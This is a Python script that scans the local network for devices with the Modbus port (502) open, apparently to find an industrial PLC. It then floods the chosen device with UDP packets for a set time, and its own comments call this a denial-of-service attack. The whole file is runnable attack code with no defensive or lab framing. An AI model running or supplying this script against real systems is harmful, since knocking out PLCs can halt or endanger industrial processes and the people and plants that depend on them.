import socket
import time
import subprocess
import re

# Configuration (adjust as needed)
TARGET_PORT = 502  # Typical Modbus port, adjust if different
ATTACK_DURATION = 60 # seconds, duration of the attack
PACKET_SIZE = 1024  # Size of the malicious packet

# Function to find the PLC's IP address by pinging the network and scanning for a Modbus port
def find_plc_ip():
    """
    Scans the local network for potential PLC IP addresses by performing a ping sweep
    and checking for open Modbus ports (TCP 502).  This assumes the PLC responds to ping.

    Returns:
        str: The IP address of the PLC if found, None otherwise.
    """
    try:
        # Get network information (IP address and subnet mask)
        ipconfig_result = subprocess.check_output(['ipconfig', '/all'], text=True)
        ip_address_pattern = r"IPv4 Address\. . . . . . . . . . . : (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
        subnet_mask_pattern = r"Subnet Mask\. . . . . . . . . . . : (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"

        ip_address_match = re.search(ip_address_pattern, ipconfig_result)
        subnet_mask_match = re.search(subnet_mask_pattern, ipconfig_result)

        if not ip_address_match or not subnet_mask_match:
            print("Error: Could not determine local IP address and subnet mask.")
            return None

        local_ip = ip_address_match.group(1)
        subnet_mask = subnet_mask_match.group(1)

        # Calculate the network address and broadcast address
        ip_parts = list(map(int, local_ip.split('.')))
        mask_parts = list(map(int, subnet_mask.split('.')))

        network_parts = [ip_parts[i] & mask_parts[i] for i in range(4)]
        network_address = '.'.join(map(str, network_parts))

        # Calculate the number of hosts by inverting the subnet mask and subtracting 1
        num_hosts = 2**(32 - sum(bin(x).count('1') for x in mask_parts)) - 2
        if num_hosts > 254:
            print("Warning: Network has a large number of hosts. Scan may take a while.")


        network_prefix = '.'.join(network_address.split('.')[:3]) + '.'

        potential_plcs = []

        print("Scanning network for potential PLCs...")

        for i in range(1, 255): # Scan a /24 network (most common)
            target_ip = network_prefix + str(i)
            if target_ip == local_ip:
                continue  # Skip the local machine

            try:
                # Ping the address
                ping_result = subprocess.run(['ping', '-n', '1', '-w', '500', target_ip], capture_output=True, text=True) # -n 1 = one ping, -w 500 = 0.5 second timeout

                if ping_result.returncode == 0: # Ping successful, now check for Modbus
                    print(f"Ping successful to {target_ip}. Checking for Modbus...")
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1) # short timeout
                    try:
                        sock.connect((target_ip, TARGET_PORT))
                        print(f"Modbus detected on {target_ip}:{TARGET_PORT}")
                        potential_plcs.append(target_ip)
                    except (socket.timeout, socket.error) as e:
                        #print(f"Modbus not detected on {target_ip}. Error: {e}")
                        pass  # Modbus not found or connection refused
                    finally:
                        sock.close()
                else:
                    #print(f"Ping failed to {target_ip}")
                    pass # Ping failed, likely no device there

            except Exception as e:
                print(f"Error scanning {target_ip}: {e}")

        if potential_plcs:
            print("Potential PLC IP addresses found:", potential_plcs)
            if len(potential_plcs) == 1:
              return potential_plcs[0]
            else:
              print("Multiple potential PLCs found.  Please manually verify which is the correct target and update the TARGET_IP variable.")
              return None # Unable to automatically choose a PLC from the list

        else:
            print("No PLCs found on the network.")
            return None

    except Exception as e:
        print(f"An error occurred during network scanning: {e}")
        return None



def perform_dos_attack(target_ip, target_port, attack_duration, packet_size):
    """
    Performs a simple Denial-of-Service attack by flooding the target with UDP packets.

    Args:
        target_ip (str): The IP address of the target PLC.
        target_port (int): The port number to attack.
        attack_duration (int): The duration of the attack in seconds.
        packet_size (int): The size of the UDP packets to send.
    """

    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Create a malicious packet (filled with garbage data)
        malicious_packet = b"A" * packet_size  # Create a byte string

        start_time = time.time()
        print(f"Starting DoS attack against {target_ip}:{target_port} for {attack_duration} seconds...")

        while time.time() - start_time < attack_duration:
            # Send the packet to the target
            sock.sendto(malicious_packet, (target_ip, target_port))

            # Optional: Add a small delay to avoid overwhelming the network completely
            # time.sleep(0.001)  # Adjust as needed (e.g., 0.0001 for very fast sending)

        print("DoS attack finished.")

    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"An error occurred during the attack: {e}")
    finally:
        sock.close() # Ensure the socket is closed



if __name__ == "__main__":
    # 1. Find the PLC's IP address
    TARGET_IP = find_plc_ip()  #Get the target IP address

    if TARGET_IP is None:
      print("Unable to determine PLC IP address. Exiting.")
      exit(1)

    print(f"Using PLC IP address: {TARGET_IP}")


    # 2. Perform the DoS attack
    perform_dos_attack(TARGET_IP, TARGET_PORT, ATTACK_DURATION, PACKET_SIZE)